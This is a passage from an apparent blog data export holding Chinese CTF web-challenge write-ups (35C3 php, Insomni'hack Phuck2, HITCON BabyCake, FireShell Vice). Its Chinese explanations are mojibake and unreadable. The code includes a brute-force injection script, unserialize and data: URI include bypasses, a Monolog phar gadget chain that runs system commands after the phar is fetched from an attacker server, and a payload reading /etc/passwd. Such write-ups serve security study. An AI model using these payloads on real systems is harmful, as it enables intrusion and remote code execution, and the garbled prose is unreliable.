stringurl=&quot;http://192.168.60.131/cgi-bin/py.py?source=&#123;0&#125;&amp;value1=&#123;1&#125;&amp;op=&#123;2&#125;&amp;value2=&#123;3&#125;&quot;flag=&quot;&quot;source=&quot;&quot;value1=urllib.parse.quote(&quot;T&quot;)op=urllib.parse.quote(&quot;+f&quot;)value2=urllib.parse.quote(&quot;ru&#123;FLAG&gt;source or 14:x&#125;&quot;)while True: prev = 0 for i in range(255): if chr(i) in string.printable: source=flag+chr(prev) source=urllib.parse.quote(source) result=requests.get(url.format(source,value1,op,value2)).text #print(result) if &quot;True&quot; in result and &quot;security&quot; not in result: flag+=chr(prev-1) print(flag) break else: prev=i flag{5b6e26f3-ad46-4165-9f55-7766c3bb2fff}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"f-string","slug":"f-string","permalink":"http://tiaonmmn.github.io/tags/f-string/"}]},{"title":"35C3CTF-php","slug":"35C3CTF-php","date":"2019-05-15T07:05:04.000Z","updated":"2019-12-10T12:15:12.577Z","comments":true,"path":"2019/05/15/35C3CTF-php/","link":"","permalink":"http://tiaonmmn.github.io/2019/05/15/35C3CTF-php/","excerpt":"","text":"1234567891011121314151617181920&lt;!-- more --&gt;&lt;?php$line = trim(fgets(STDIN));$flag = file_get_contents(&#x27;/flag&#x27;);class B &#123; function __destruct() &#123; global $flag; echo $flag; &#125;&#125;$a = @unserialize($line);throw new Exception(&#x27;Well that was unexpected!&#x27;);echo $a;?&gt; åŸä»¥ä¸º PHP é‡Œä¸€ä¸ªç±»çš„__destruct æ–¹æ³•åœ¨ç¨‹åºç»“æŸæ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œç»“æœä¸æ˜¯ã€‚unserialize ååºåˆ—åŒ–ä¸€ä¸ªç±»åï¼Œå¦‚æœå˜é‡ä¸ªæ•°å¯¹åº”ä¸ä¸Šçš„è¯ï¼Œä¼šç›´æ¥é”€æ¯åŸæœ‰çš„ç±»ï¼Œè°ƒç”¨__destruct æ–¹æ³•ã€‚è¿™ä¸ªé¢˜å°±å¾ˆç®€å•äº†ï¼Œè®© unserialize å‡ºé”™å°±è¡Œäº†ã€‚serialize(new B()) åè¿”å› O:1:â€Bâ€:0:{}ï¼Œclass B é‡Œæ²¡æœ‰ä»»ä½•å†…éƒ¨å˜é‡ï¼Œå› æ­¤ 0:{}ï¼Œæˆ‘ä»¬æ”¹æˆä»»æ„å€¼ï¼Œå³å¯è®©å…¶æŠ¥é”™ã€‚O:1:â€Bâ€:1:{} å°±å¯ä»¥äº†ã€‚__destruct æ–¹æ³•è‡ªåŠ¨è°ƒç”¨ã€‚ flag{b6b31fd1-4e2f-4a50-82af-21290dc253ec}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"}]},{"title":"Insomni-hack-teaser-2019-Phuck2","slug":"Insomni-hack-teaser-2019-Phuck2","date":"2019-05-15T06:56:49.000Z","updated":"2019-12-10T12:15:12.666Z","comments":true,"path":"2019/05/15/Insomni-hack-teaser-2019-Phuck2/","link":"","permalink":"http://tiaonmmn.github.io/2019/05/15/Insomni-hack-teaser-2019-Phuck2/","excerpt":"ä»Šå¤©ç»§ç»­å­¦ä¹  PHP çŸ¥è¯†ã€‚Insomni hackerâ€™s teaser 2019 çš„ Phuck2ï¼Œé¢˜ç›®æ¯”è¾ƒç®€å•ï¼Œé¡ºä¾¿å­¦ä¹ äº†ä¸€ä¸‹ Data URI Schemeã€‚ç¯å¢ƒåœ¨è¿™é‡Œã€‚","text":"ä»Šå¤©ç»§ç»­å­¦ä¹  PHP çŸ¥è¯†ã€‚Insomni hackerâ€™s teaser 2019 çš„ Phuck2ï¼Œé¢˜ç›®æ¯”è¾ƒç®€å•ï¼Œé¡ºä¾¿å­¦ä¹ äº†ä¸€ä¸‹ Data URI Schemeã€‚ç¯å¢ƒåœ¨è¿™é‡Œã€‚ 123456789101112131415161718192021222324252627&lt;?php stream_wrapper_unregister(&#x27;php&#x27;); if(isset($_GET[&#x27;hl&#x27;])) highlight_file(__FILE__); $mkdir = function($dir) &#123; system(&#x27;mkdir -- &#x27;.escapeshellarg($dir)); &#125;; $randFolder = bin2hex(random_bytes(16)); $mkdir(&#x27;users/&#x27;.$randFolder); chdir(&#x27;users/&#x27;.$randFolder); $userFolder = (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]) ? $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;] : $_SERVER[&#x27;REMOTE_ADDR&#x27;]); $userFolder = basename(str_replace([&#x27;.&#x27;,&#x27;-&#x27;],[&#x27;&#x27;,&#x27;&#x27;],$userFolder)); $mkdir($userFolder); chdir($userFolder); file_put_contents(&#x27;profile&#x27;,print_r($_SERVER,true)); chdir(&#x27;..&#x27;); $_GET[&#x27;page&#x27;]=str_replace(&#x27;.&#x27;,&#x27;&#x27;,$_GET[&#x27;page&#x27;]); if(!stripos(file_get_contents($_GET[&#x27;page&#x27;]),&#x27;&lt;?&#x27;) &amp;&amp; !stripos(file_get_contents($_GET[&#x27;page&#x27;]),&#x27;php&#x27;)) &#123; include($_GET[&#x27;page&#x27;]); &#125; chdir(__DIR__); system(&#x27;rm -rf users/&#x27;.$randFolder);?&gt; ä¸Šæ¥å…ˆ ban äº† php æµï¼ŒçŒœä¸€ä¸‹æ˜¯æ–‡ä»¶åŒ…å«çš„é¢˜ã€‚$mkdir å‡½æ•°ç”¨çš„ system å‡½æ•°è°ƒç”¨ mkdir å‘½ä»¤ï¼Œçœ‹èµ·æ¥æœ‰æå¤´ï¼Œä½†æ˜¯åé¢çš„ escapeshellarg æ²¡æ³•ç»•ï¼Œæš‚æ—¶ä½œç½¢ã€‚æ¯ä¸ªç”¨æˆ·æ–°å»ºç‹¬ç«‹ç›®å½•å¹¶åˆ‡è¿›å»ã€‚ä¸‹é¢çš„ $userFolder å¼€å§‹æœ‰è¶£äº†ï¼Œä» X-Forwarded-For å¤´é‡Œæ‹¿ç›®å½•åå­—ä½œä¸º userFolderï¼Œå¹¶ä¸”è¿‡æ»¤. å’Œ - è¿™ä¸¤ä¸ªç¬¦å·ã€‚file_put_contents ä»¤äººçœ¼å‰ä¸€äº®ï¼ŒæŠŠ $_SERVER çš„æ‰€æœ‰æ•°æ®å†™åˆ° userFolder/profile é‡Œï¼Œå¹¶ä¸”å®Œå…¨æ²¡æœ‰è¿‡æ»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬éšä¾¿æé€ ä¸€ä¸ª HTTP å¤´ï¼Œä¼ å…¥ä»»æ„ PHP ä»£ç ï¼Œå¯ä»¥é€ æˆ RCEã€‚è€Œåé¢çš„ include å°è¯äº†æˆ‘ä»¬çš„æƒ³æ³•ã€‚ä½†æ˜¯ include çš„å†…å®¹æœ‰ç‚¹é—®é¢˜ï¼Œä¸èƒ½å‡ºç° &lt;? å’Œ phpï¼Œå› æ­¤æˆ‘ä»¬æ²¡åŠæ³•ç›´æ¥ä¼  page=XXX/profileã€‚åé¢ç»™å‡ºçš„ phpinfo.php æç¤ºæˆ‘ä»¬ allow_url_fopen ä¸º Onï¼Œè€Œ allow_url_include ä¸º Offï¼Œå°±æ²¡æœ‰åŠæ³•ç›´æ¥ä¼ äº†ã€‚ åæ¥å‘ç° include ä¸ file_get_contents åœ¨å…³äº Data URI å¤„ç†é—®é¢˜ä¸Šçš„é—®é¢˜ã€‚include () ä¸ file_get_contents () æ”¯æŒ data:ï¼Œæ³¨æ„ä¸æ˜¯ data:// æµï¼Œæ˜¯ data:text/vnd-example+xyz;foo=bar;base64,R0lGODdh è¿™ç§ä¸œè¥¿ã€‚Data URI åœ¨ç½‘é¡µä¸­å…¶å®ç»å¸¸è§åˆ°ï¼Œdata:image/jpeg;base64,XXXXX ç»å¸¸å†…åµŒåœ¨ç½‘é¡µä¸­ç›´æ¥ä¼ è¾“å›¾ç‰‡ã€‚è¯è¯´å›æ¥ï¼Œfile_get_contents ä¸ include åœ¨å¤„ç† data:, æ—¶å…·æœ‰æŸäº›å¥‡æ€ªçš„ç‰¹æ€§ã€‚ file_get_contents å…è®¸ä½¿ç”¨ data URIï¼Œä¼šç›´æ¥è¿”å›åé¢çš„å†…å®¹ï¼Œå¾ˆå¥‡æ€ªçš„æ˜¯ï¼Œåœ¨ allow_url_include=Off çš„æƒ…å†µä¸‹ï¼Œä¸å…è®¸ include data URI çš„ï¼Œä½†æ˜¯å¦‚æœ data:,XXX æ˜¯ä¸€ä¸ªç›®å½•åçš„è¯ï¼Œå°±ä¼šæ”¾å¼€é™åˆ¶ã€‚æ‰€ä»¥ä½¿ç”¨è¿™ä¸ªç»•è¿‡ã€‚ flag{d12dce31-43b4-45ef-8bed-ddede1045228}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Data URI Scheme","slug":"Data-URI-Scheme","permalink":"http://tiaonmmn.github.io/tags/Data-URI-Scheme/"}]},{"title":"HITCON2018-BabyCake","slug":"HITCON2018-BabyCake","date":"2019-05-15T06:42:10.000Z","updated":"2020-03-05T07:18:53.441Z","comments":true,"path":"2019/05/15/HITCON2018-BabyCake/","link":"","permalink":"http://tiaonmmn.github.io/2019/05/15/HITCON2018-BabyCake/","excerpt":"èŠ±äº†å‡ å¤©æ—¶é—´ææ˜ç™½ä¸€é“é¢˜ï¼Œæ”¾ç¯å¢ƒæœ‰ç‚¹æ™šã€‚ æºç å®¡è®¡çš„é¢˜ï¼Œè·Ÿ SSRF æ— å…³ã€‚ç”¨çš„ CakePHP æ¡†æ¶ï¼ŒPHP7.2 ç‰ˆæœ¬çš„ã€‚æ‰“å¼€é¡µé¢åè®©æˆ‘ä»¬è¾“å…¥ URLï¼Œä½†åˆä¸æ˜¯ SSRFï¼Œååºåˆ—åŒ–ï¼ŸçŒœä¸åˆ°ï¼Œçœ‹æºç å§ã€‚","text":"èŠ±äº†å‡ å¤©æ—¶é—´ææ˜ç™½ä¸€é“é¢˜ï¼Œæ”¾ç¯å¢ƒæœ‰ç‚¹æ™šã€‚ æºç å®¡è®¡çš„é¢˜ï¼Œè·Ÿ SSRF æ— å…³ã€‚ç”¨çš„ CakePHP æ¡†æ¶ï¼ŒPHP7.2 ç‰ˆæœ¬çš„ã€‚æ‰“å¼€é¡µé¢åè®©æˆ‘ä»¬è¾“å…¥ URLï¼Œä½†åˆä¸æ˜¯ SSRFï¼Œååºåˆ—åŒ–ï¼ŸçŒœä¸åˆ°ï¼Œçœ‹æºç å§ã€‚ # Part 1.Look inside the code,and LFI. é‡ç‚¹ä»£ç åœ¨ src.php é‡Œã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111&lt;?phpnamespace App\\Controller;use Cake\\Core\\Configure;use Cake\\Http\\Client;use Cake\\Http\\Exception\\ForbiddenException;use Cake\\Http\\Exception\\NotFoundException;use Cake\\View\\Exception\\MissingTemplateException;class DymmyResponse &#123; function __construct($headers, $body) &#123; $this-&gt;headers = $headers; $this-&gt;body = $body; &#125;&#125;class PagesController extends AppController &#123; private function httpclient($method, $url, $headers, $data) &#123; $options = [ &#x27;headers&#x27; =&gt; $headers, &#x27;timeout&#x27; =&gt; 10 ]; $http = new Client(); return $http-&gt;$method($url, $data, $options); &#125; private function back() &#123; return $this-&gt;render(&#x27;pages&#x27;); &#125; private function _cache_dir($key)&#123; $ip = $this-&gt;request-&gt;getEnv(&#x27;REMOTE_ADDR&#x27;); $index = sprintf(&#x27;mycache/%s/%s/&#x27;, $ip, $key); return CACHE . $index; &#125; private function cache_set($key, $response) &#123; $cache_dir = $this-&gt;_cache_dir($key); if ( !file_exists($cache_dir) ) &#123; mkdir($cache_dir, 0700, true); file_put_contents($cache_dir . &quot;body.cache&quot;, $response-&gt;body); file_put_contents($cache_dir . &quot;headers.cache&quot;, serialize($response-&gt;headers)); &#125; &#125; private function cache_get($key) &#123; $cache_dir = $this-&gt;_cache_dir($key); if (file_exists($cache_dir)) &#123; $body = file_get_contents($cache_dir . &quot;/body.cache&quot;); $headers = file_get_contents($cache_dir . &quot;/headers.cache&quot;); $body = &quot;&lt;!-- from cache --&gt;\\n&quot; . $body; $headers = unserialize($headers); return new DymmyResponse($headers, $body); &#125; else &#123; return null; &#125; &#125; public function display(...$path) &#123; $request = $this-&gt;request; $data = $request-&gt;getQuery(&#x27;data&#x27;); $url = $request-&gt;getQuery(&#x27;url&#x27;); if (strlen($url) == 0) return $this-&gt;back(); $scheme = strtolower( parse_url($url, PHP_URL_SCHEME) ); if (strlen($scheme) == 0 || !in_array($scheme, [&#x27;http&#x27;, &#x27;https&#x27;])) return $this-&gt;back(); $method = strtolower( $request-&gt;getMethod() ); if ( !in_array($method, [&#x27;get&#x27;, &#x27;post&#x27;, &#x27;put&#x27;, &#x27;delete&#x27;, &#x27;patch&#x27;]) ) return $this-&gt;back(); $headers = []; foreach ($request-&gt;getHeaders() as $key =&gt; $value) &#123; if (in_array( strtolower($key), [&#x27;host&#x27;, &#x27;connection&#x27;, &#x27;expect&#x27;, &#x27;content-length&#x27;] )) continue; if (count($value) == 0) continue; $headers[$key] = $value[0]; &#125; $key = md5($url); if ($method == &#x27;get&#x27;) &#123; $response = $this-&gt;cache_get($key); if (!$response) &#123; $response = $this-&gt;httpclient($method, $url, $headers, null); $this-&gt;cache_set($key, $response); &#125; &#125; else &#123; $response = $this-&gt;httpclient($method, $url, $headers, $data); &#125; foreach ($response-&gt;headers as $key =&gt; $value) &#123; if (strtolower($key) == &#x27;content-type&#x27;) &#123; $this-&gt;response-&gt;type(array(&#x27;type&#x27; =&gt; $value)); $this-&gt;response-&gt;type(&#x27;type&#x27;); continue; &#125; $this-&gt;response-&gt;withHeader($key, $value); &#125; $this-&gt;response-&gt;body($response-&gt;body); return $this-&gt;response; &#125;&#125; å¾ˆæ˜æ˜¾ï¼Œå…è®¸æˆ‘ä»¬è¾“å…¥çš„ URL åªèƒ½æ˜¯ HTTP æˆ– HTTPS åè®®çš„ï¼Œç„¶åæ ¹æ®è®¿é—®é¢˜ç›®é¡µé¢çš„ HTTP æ–¹å¼å»ï¼Œé€šè¿‡ä¸€ä¸ª httpclient æ¥å¯¹è¾“å…¥ URL è¿›è¡Œè®¿é—®ã€‚å¦‚æœä½¿ç”¨çš„æ˜¯ GET æ–¹å¼ï¼Œä¼šè®¾ç½®ç¼“å­˜ã€‚åŒæ—¶ï¼Œè®¿é—®é¢˜ç›®é¡µé¢æ—¶çš„ HTTP å¤´ä¹Ÿä¼šåŒæ—¶å‘é€åˆ° httpclient ä¸­ã€‚ ç„¶åæˆ‘ä»¬è¯¥çœ‹å•¥ï¼Ÿä»æ¥æ²¡æœ‰æºç å®¡è®¡çš„ç»éªŒï¼Œæ²¡æ€è·¯ã€‚æ—¢ç„¶æˆ‘ä»¬è¯·æ±‚çš„ URL æ˜¯é€šè¿‡ httpclient å®ç°çš„ï¼Œçœ‹ä¸€ä¸‹ Httpclient å§ã€‚åœ¨è¿™ä¹‹å‰ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°åœ¨ç”¨ GET è¯·æ±‚çš„æ—¶å€™ï¼Œä¼šè¿›è¡Œç¼“å­˜æ“ä½œï¼Œè€Œè¿™ä¸ªç¼“å­˜æ˜¯è‡ªå®šä¹‰çš„ã€‚åœ¨ cache_get () é‡Œï¼Œ$header æœ‰ä¸€ä¸ª unserialize æ“ä½œï¼Œæœ‰ç‚¹å¯ç–‘ï¼Œè€Œä¸”æ˜¯ç”¨çš„ file_get_contents () è¯»çš„ç¼“å­˜ã€‚åŒæ ·çš„ï¼Œcache_set () é‡Œä¼šå¯¹ $response è¿”å›çš„ headers åºåˆ—åŒ–ï¼Œç”¨ file_put_contents () å†™çš„ç¼“å­˜ã€‚æš‚æ—¶ä¸çŸ¥é“è¿™ä¸¤å¤„æ€ä¹ˆåˆ©ç”¨ã€‚ è·Ÿè¿› Httpclientï¼Œè¿™æ˜¯ä¸€ä¸ªå¯¹ Client ç±»çš„å°è£…ã€‚æ¥åˆ° vendor/cakephp/cakephp/src/Http/Client.php é‡Œã€‚__construct æ–¹æ³•è²Œä¼¼æ²¡ä»€ä¹ˆå¥½ç©çš„ï¼Œå°±æ˜¯å¯¹ Cookie çš„æ“ä½œã€‚ä¸»è¦æ˜¯ public function post ($url, $data = [], array $options = []) è¿™ä¸ªå‡½æ•°ï¼Œå…ˆ buildUrlï¼Œç„¶å_doRequests å‘é€ã€‚buildUrl æ²¡ä»€ä¹ˆæ„æ€ï¼Œå¯¹è¾“å…¥çš„ URL å¤„ç†ä¸€ä¸‹ã€‚è€Œ_doRequests () å…ˆæ˜¯è°ƒç”¨_createRequest ()ï¼Œç„¶å send ()ã€‚è·Ÿè¿›_createRequest ()ï¼Œå‰é¢è¿›è¡Œå¤´å¤„ç†ï¼Œåé¢ new ä¸€ä¸ª Request å¯¹è±¡ã€‚è·Ÿè¿›ï¼Œæ¥åˆ° vendor/cakephp/cakephp/src/Http/Client/Request.phpã€‚__construct () è®¾ç½®äº† Connection å’Œ User-Agent å¤´åè°ƒç”¨ body () å‡½æ•°å¤„ç† $dataã€‚è€Œ $data ä½¿ç”¨ FormData-&gt;addMany () å¤„ç†ã€‚è·Ÿè¿› addMany ()ï¼Œæ¥åˆ° vendor/cakephp/cakephp/src/Http/Client/FormData.phpã€‚addMany () å‡½æ•°å°±æ˜¯å°† $data æ•°ç»„é€é¡¹å–‚ç»™ add () å‡½æ•°ï¼Œé‡ç‚¹æ¥äº†ã€‚ 12345678910111213141516171819202122public function add($name, $value = null)&#123; if (is_array($value)) &#123; $this-&gt;addRecursive($name, $value); &#125; elseif (is_resource($value)) &#123; $this-&gt;addFile($name, $value); &#125; elseif (is_string($value) &amp;&amp; strlen($value) &amp;&amp; $value[0] === &#x27;@&#x27;) &#123; trigger_error( &#x27;Using the @ syntax for file uploads is not safe and is deprecated. &#x27; . &#x27;Instead you should use file handles.&#x27;, E_USER_DEPRECATED ); $this-&gt;addFile($name, $value); &#125; elseif ($name instanceof FormDataPart &amp;&amp; $value === null) &#123; $this-&gt;_hasComplexPart = true; $this-&gt;_parts[] = $name; &#125; else &#123; $this-&gt;_parts[] = $this-&gt;newPart($name, $value); &#125; return $this;&#125; ç¬¬ 8 è¡Œçš„åˆ¤æ–­å¾ˆæœ‰é—®é¢˜ï¼Œå¦‚æœ $value é¦–å­—ç¬¦ä¸º @ï¼Œä¼š trigger_error ()ï¼Œç„¶å addFile ()ã€‚trigger_error () ä¸ä¼šåœæ­¢æ‰§è¡Œï¼Œä¸‹é¢çœ‹ addFile ()ã€‚ 123456789101112131415161718192021222324252627282930public function addFile($name, $value)&#123; $this-&gt;_hasFile = true; $filename = false; $contentType = &#x27;application/octet-stream&#x27;; if (is_resource($value)) &#123; $content = stream_get_contents($value); if (stream_is_local($value)) &#123; $finfo = new finfo(FILEINFO_MIME); $metadata = stream_get_meta_data($value); $contentType = $finfo-&gt;file($metadata[&#x27;uri&#x27;]); $filename = basename($metadata[&#x27;uri&#x27;]); &#125; &#125; else &#123; $finfo = new finfo(FILEINFO_MIME); $value = substr($value, 1); $filename = basename($value); $content = file_get_contents($value); $contentType = $finfo-&gt;file($value); &#125; $part = $this-&gt;newPart($name, $content); $part-&gt;type($contentType); if ($filename) &#123; $part-&gt;filename($filename); &#125; $this-&gt;add($part); return $part;&#125; \\(value æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥ file_get_contents (\\)value)ï¼Œç„¶åè¿”å›åˆ° $partã€‚å› æ­¤è¿™é‡Œæœ‰ä¸€å¤„ LFIã€‚ç„¶åæˆ‘ä»¬èƒ½å¹²ä»€ä¹ˆå‘¢ï¼Ÿ Part 2.LFI to RCE. 2018 å¹´ç‰¹åˆ«ç«çš„ä¸€ä¸ªè€ƒç‚¹å°±æ˜¯ phar:// çš„ååºåˆ—åŒ–æ¼æ´é—®é¢˜ã€‚è€Œ file_get_contents ç¡®å®ä¹Ÿå¯ä»¥é€ æˆååºåˆ—åŒ–ã€‚é‚£ä¹ˆæœ¬é¢˜è§£é¢˜æ€è·¯å‡ºæ¥äº†ï¼š é¦–å…ˆéœ€è¦ä¸€å° VPSã€‚åˆ©ç”¨è¯·æ±‚å°†æ¶æ„ phar æ–‡ä»¶ä¿å­˜åœ¨ cache ä¸­ã€‚ ç„¶åå‘å‡º POST è¯·æ±‚ï¼Œæœ€ç»ˆä½¿ file_get_contents () è§¦å‘ cache ä¸­çš„ phar RCEã€‚ æ€è·¯æ˜ç¡®äº†ï¼Œä½†æ˜¯æˆ‘ä»¬è¦æ‰¾ä¸€ä¸ªèƒ½å¤Ÿè§¦å‘ååºåˆ—åŒ–æ¼æ´çš„ç‚¹ã€‚è¿™æ—¶ä¸å¦¨å›å»çœ‹çœ‹ composer.jsonã€‚å…¶ä¸­ monolog/monolog è¿™ä¸ªåŒ…æœ‰ç‚¹å¼•äººæ³¨æ„ï¼Œå®ƒæ›¾ç»ç¡®å®çš„å‡ºç°è¿‡ååºåˆ—åŒ–æ¼æ´ï¼Œå»æ‰¾ä¸€ä¸‹ä¿¡æ¯ï¼Œé¢˜ç›®æ‰€å®‰è£…çš„ç‰ˆæœ¬ä¹Ÿç¡®å®å­˜åœ¨è¿™ä¸ªæ¼æ´ã€‚é‚£ä¹ˆç›´æ¥å†™è¿™ä¸ª Payload å°±å¥½äº†ã€‚Github ä¸Šæœ‰ã€‚æ„é€ å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phpnamespace Monolog\\Handler&#123; class SyslogUdpHandler &#123; protected $socket; function __construct($x) &#123; $this-&gt;socket = $x; &#125; &#125; class BufferHandler &#123; protected $handler; protected $bufferSize = -1; protected $buffer; # ($record[&#x27;level&#x27;] &lt; $this-&gt;level) == false protected $level = null; protected $initialized = true; # ($this-&gt;bufferLimit &gt; 0 &amp;&amp; $this-&gt;bufferSize === $this-&gt;bufferLimit) == false protected $bufferLimit = -1; protected $processors; function __construct($methods, $command) &#123; $this-&gt;processors = $methods; $this-&gt;buffer = [$command]; $this-&gt;handler = clone $this; &#125; &#125;&#125;namespace&#123; $cmd = &quot;ls -alt&quot;; //Modify here. $obj = new \\Monolog\\Handler\\SyslogUdpHandler( new \\Monolog\\Handler\\BufferHandler( [&#x27;current&#x27;, &#x27;system&#x27;], [$cmd, &#x27;level&#x27; =&gt; null] ) ); $phar = new Phar(&#x27;exploit.phar&#x27;); $phar-&gt;startBuffering(); $phar-&gt;addFromString(&#x27;test&#x27;, &#x27;test&#x27;); $phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;); $phar-&gt;setMetadata($obj); $phar-&gt;stopBuffering();&#125; å°†ç”Ÿæˆçš„ exploit.phar æ”¾åˆ°æœåŠ¡å™¨ä¸Šï¼Œç„¶ååœ¨é¢˜ç›®é¡µé¢ä¸Šè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š A[&quot;ä½¿ç”¨ GET æ–¹å¼è®¿é—® http:&#x2F;&#x2F;XXX.XXX.XXX.XXX&#x2F;?url&#x3D;http:&#x2F;&#x2F;YYY.YYY.YYY.YYY&#x2F;exploit.phar&quot;] --&gt; B B[&quot;ä½¿ç”¨ POST æ–¹å¼è®¿é—® &#96;http:&#x2F;&#x2F;XXX.XXX.XXX.XXX&#x2F;?url&#x3D;http:&#x2F;&#x2F;YYY.YYY.YYY.YYY&amp;data[test\\]&#x3D;@phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;tmp&#x2F;cache&#x2F;mycache&#x2F;CLIENT_IP&#x2F;MD5(http:&#x2F;&#x2F;IP&#x2F;exploit.phar)&#x2F;body.cache&quot;] è¿™æ ·å°±å¯ä»¥ Getshell äº†ã€‚ flag{851489de-10d6-450b-b8f9-479bfd2e4dd5}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"CakePHP","slug":"CakePHP","permalink":"http://tiaonmmn.github.io/tags/CakePHP/"}]},{"title":"FireShell2019-Vice","slug":"FireShell2019-Vice","date":"2019-05-14T13:07:07.000Z","updated":"2019-12-10T12:15:12.610Z","comments":true,"path":"2019/05/14/FireShell2019-Vice/","link":"","permalink":"http://tiaonmmn.github.io/2019/05/14/FireShell2019-Vice/","excerpt":"å¿«è¿‡å¹´äº†ï¼Œæ‹–äº†å‡ å¤©ã€‚ç¯å¢ƒåœ¨è¿™ã€‚ é¢˜ç›®ä¸éš¾ï¼Œç›´æ¥ç»™äº†æºç ã€‚","text":"å¿«è¿‡å¹´äº†ï¼Œæ‹–äº†å‡ å¤©ã€‚ç¯å¢ƒåœ¨è¿™ã€‚ é¢˜ç›®ä¸éš¾ï¼Œç›´æ¥ç»™äº†æºç ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php//require_once &#x27;/app/public/config.php&#x27;;class SHITS&#123; private $url; private $method; private $addr; private $host; private $name; function __construct($method,$url)&#123; $this-&gt;method = $method; $this-&gt;url = $url; &#125; function doit()&#123; $this-&gt;host = @parse_url($this-&gt;url)[&#x27;host&#x27;]; $this-&gt;addr = @gethostbyname($this-&gt;host); $this-&gt;name = @gethostbyaddr($this-&gt;host); if($this-&gt;addr !== &quot;127.0.0.1&quot; || $this-&gt;name === false)&#123; $not = [&#x27;.txt&#x27;,&#x27;.php&#x27;,&#x27;.xml&#x27;,&#x27;.html&#x27;,&#x27;.&#x27;,&#x27;[&#x27;,&#x27;]&#x27;]; foreach($not as $ext)&#123; $p = strpos($this-&gt;url,$ext); if($p)&#123; die(&quot;:)&quot;); &#125; &#125; $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$this-&gt;url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $result = curl_exec($ch); echo $result; &#125;else&#123; die(&quot;:)&quot;); &#125; &#125; function __destruct()&#123; if(in_array($this-&gt;method,array(&quot;doit&quot;)))&#123; call_user_func_array(array($this,$this-&gt;method),array()); &#125;else&#123; die(&quot;:)&quot;); &#125; &#125;&#125;if(isset($_GET[&quot;gg&quot;])) &#123; @unserialize($_GET[&quot;gg&quot;]);&#125; else &#123; highlight_file(__FILE__);&#125;?&gt; çœ‹åˆ° unserializeï¼ŒçŒœåˆ°æ˜¯ä¸ªååºåˆ—åŒ–çš„é¢˜äº†ã€‚å¼€å¤´çš„ requireï¼Œä»¥åŠä¸‹é¢çš„ curlï¼Œç›®æµ‹æ˜¯ååºåˆ—åŒ–å¯¼è‡´ SSRFã€‚__destruct æ–¹æ³•æç¤ºï¼Œæˆ‘ä»¬éœ€è¦ç»™ method èµ‹å€¼ doitï¼Œä¸èƒ½è·³å‡ºåˆ°å…¶å®ƒå‡½æ•°ã€‚ç„¶åçœ‹ doitï¼Œå¦‚æœä¼ å…¥çš„ url ä¸æ˜¯ä»¥ 127.0.0.1 åš Hostï¼Œå¹¶ä¸”ä¸å‡ºç°.txtã€.phpã€.xmlã€.htmlã€.ã€[ã€] è¿™å…¶ä¸­ä¹‹ä¸€ã€‚æ³¨æ„ä»–ç”¨çš„æ˜¯ strpos () åˆ¤æ–­ã€‚ç„¶åä½¿ç”¨ curl è®¿é—®ï¼Œå¹¶æ˜¾ç¤ºç»“æœã€‚ é¦–å…ˆæˆ‘ä»¬éœ€è¦æœ‰ä¸€ä¸ªèƒ½å¤Ÿè¿è¡Œçš„ååºåˆ—åŒ–æ¨¡æ¿ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php//require_once &#x27;/app/public/config.php&#x27;;class SHITS&#123; private $url; private $method; private $addr; private $host; private $name; function __construct($method,$url)&#123; $this-&gt;method = $method; $this-&gt;url = $url; &#125; function doit()&#123; kan$this-&gt;host = @parse_url($this-&gt;url)[&#x27;host&#x27;]; $this-&gt;addr = @gethostbyname($this-&gt;host); $this-&gt;name = @gethostbyaddr($this-&gt;host); if($this-&gt;addr !== &quot;127.0.0.1&quot; || $this-&gt;name === false)&#123; $not = [&#x27;.txt&#x27;,&#x27;.php&#x27;,&#x27;.xml&#x27;,&#x27;.html&#x27;,&#x27;.&#x27;,&#x27;[&#x27;,&#x27;]&#x27;]; foreach($not as $ext)&#123; $p = strpos($this-&gt;url,$ext); if($p)&#123; die(&quot;:)&quot;); &#125; &#125; $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$this-&gt;url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $result = curl_exec($ch); echo $result; &#125;else&#123; die(&quot;:)&quot;); &#125; &#125; function __destruct()&#123; if(in_array($this-&gt;method,array(&quot;doit&quot;)))&#123; call_user_func_array(array($this,$this-&gt;method),array()); &#125;else&#123; die(&quot;:)&quot;); &#125; &#125;&#125;$a=new SHITS(&quot;doit&quot;,&quot;file:///etc/passwd&quot;);print(serialize($a));?&gt; è¿è¡Œå³å¯å‡ºç»“æœã€‚æ­£å¸¸æƒ…å†µä¸‹åº”è¯¥å¯ä»¥è¯» 